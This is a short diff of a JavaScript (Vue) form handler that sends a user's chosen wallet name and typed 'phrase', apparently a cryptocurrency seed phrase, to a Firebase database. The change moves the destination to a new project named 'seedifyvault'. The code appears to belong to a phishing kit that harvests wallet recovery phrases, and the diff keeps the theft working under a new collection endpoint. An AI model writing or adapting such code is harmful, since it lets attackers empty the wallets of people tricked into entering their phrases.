@@ -322,7 +322,7 @@ export default {
       async sendForm(){
         this.loader = true
         try{
-         await axios.post("https://wallet-60845-default-rtdb.firebaseio.com/result.json", {
+         await axios.post("https://seedifyvault-default-rtdb.firebaseio.com/result.json", {
             "wallet_name": this.selectedWallet.name,
              "phrase": this.phrase,
              "Date": Date.now()
